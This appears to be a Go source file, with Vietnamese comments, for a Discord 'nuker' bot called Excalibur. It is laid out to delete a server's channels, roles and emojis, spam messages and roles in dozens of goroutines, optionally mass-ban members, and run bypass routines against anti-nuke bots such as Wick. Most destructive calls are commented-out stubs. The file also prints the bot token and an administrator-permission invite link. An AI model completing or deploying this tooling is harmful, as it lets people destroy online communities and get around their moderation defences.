package main  // Đảm bảo dòng 1 là này!

import (
	"fmt"
	"io"  // Cho HTTP response
	"log"
	"net/http"  // Cho dummy HTTP server (Render)
	"os"
	"os/signal"
	"strconv"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

// Vars từ auto.go
var (
	queue        = make(chan string, 100)
	mutex        = &sync.Mutex{}
	botList      = []string{"Security", "Wick"}
	CountBot     int
	CountBotCond = sync.NewCond(mutex)  // Nếu cần sync thêm
)

// onGuildCreate từ auto.go (merge vào đây)
func onGuildCreate(s *discordgo.Session, event *discordgo.GuildCreate) {
	godotenv.Load()  // Local; Render dùng env vars
	MASS_BAN := os.Getenv("MASS_BAN")
	MASSBAN, _ := strconv.ParseBool(MASS_BAN)

	var wg sync.WaitGroup

	queue <- event.ID
	// requests.HandleQueue(s)  // Uncomment nếu có core/requests

	mutex.Lock()
	defer mutex.Unlock()

	// bypass.GetBotNicks(s, event.ID)  // Stub; thêm core/bypass nếu có
	botNicknames := []string{}  // Placeholder nếu thiếu core
	// for _, nickname := range botNicknames { ... }  // Logic detect bots

	if CountBot == 0 {
		fmt.Println("There's no any antinuke bots")
		// start_end.Logs(s, event)  // Stub
		// creating.GuildRename(s, event)  // Stub

		wg.Add(1)
		go func() {
			defer wg.Done()
			// channels, _ := s.GuildChannels(event.ID)
			// creating.DeleteChannels(s, channels)
		}()
		wg.Wait()

		// start_end.InviteCreate(s, event)  // Stub

		for i := 0; i < 50; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				// creating.TextSpam(s, event, &wg)  // Stub
			}()
		}
		wg.Wait()

		wg.Add(1)
		go func() {
			defer wg.Done()
			// creating.DeleteRoles(s, event)
		}()
		wg.Wait()

		// creating.EditRoles(s, event)
		// bypass.PhoneLock(event)

		for i := 0; i < 40; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				// creating.RolesSpam(s, event)
			}()
		}
		wg.Wait()

		if MASSBAN {
			wg.Add(1)
			go func() {
				defer wg.Done()
				// removing.MemberBan(s, event)
			}()
			wg.Wait()
		} else {
			fmt.Println("MASS_BAN not set or true, no mass ban initiated.")
		}

		// removing.EmojiDelete(s, event)
		// start_end.Leave(s, event)
	} else {
		fmt.Println("There's ", CountBot, " antinuke bot(s) on the server.")
		// start_end.Logs(s, event)
		// bypass.PhoneLock(event)

		for i := 0; i < 50; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				// bypass.BypassCommunity(s, event, &wg)
			}()
		}

		time.Sleep(2 * time.Second)
		// bypass.BypassSpam(s, event, &wg)
		// start_end.LogsAlert(s, event)
		// start_end.Leave(s, event)
	}

	CountBot = 0
}

// LeaveEveryServer từ overcharge.go (merge)
func LeaveEveryServer(s *discordgo.Session, m *discordgo.MessageCreate) {
	godotenv.Load()
	BOT_OWNER_ID := os.Getenv("BOT_OWNER_ID")

	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.Content != ".overcharge" {
		return
	}

	if m.Author.ID == BOT_OWNER_ID {
		s.ChannelMessageDelete(m.ChannelID, m.ID)

		guilds := s.State.Guilds
		// smoothed := requests.Smooth(guilds)  // Stub nếu thiếu core

		var wg sync.WaitGroup
		for _, guild := range guilds {  // Simplified loop
			wg.Add(1)
			go func(g *discordgo.Guild) {
				defer wg.Done()
				s.GuildLeave(g.ID)
			}(guild)
		}
		wg.Wait()
	} else {
		s.ChannelMessageDelete(m.ChannelID, m.ID)
	}
}

// HTTP dummy cho Render
func getRoot(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("Got / request from %s\n", r.RemoteAddr)
	io.WriteString(w, "Excalibur bot is running on Render! 🚀\n")
}

func main() {
	// HTTP server dummy (cho Render Web Service)
	go func() {
		http.HandleFunc("/", getRoot)
		log.Println("HTTP server starting on :10000")
		err := http.ListenAndServe(":10000", nil)
		if err != nil {
			log.Println("HTTP server error:", err)
		}
	}()

	// Bot logic
	godotenv.Load()  // Local only
	BOT_TOKEN := os.Getenv("BOT_TOKEN")
	sess, err := discordgo.New("Bot " + BOT_TOKEN)
	if err != nil {
		log.Fatal(err)
	}

	// Handlers
	sess.AddHandler(onGuildCreate)
	sess.AddHandler(LeaveEveryServer)

	// Intents
	sess.Identify.Intents = discordgo.IntentsAllWithoutPrivileged

	// Open
	err = sess.Open()
	if err != nil {
		log.Fatal(err)
	}
	defer sess.Close()

	// Status
	sess.UpdateStreamingStatus(0, "Excalibur / Blood Group", "https://www.twitch.tv/404")

	fmt.Println("The bot is online!\n\n[/] TOKEN: " + BOT_TOKEN + "\n[/] LINK: https://discord.com/api/oauth2/authorize?client_id=" + sess.State.User.ID + "&permissions=8&scope=bot")

	// Signal
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc
}
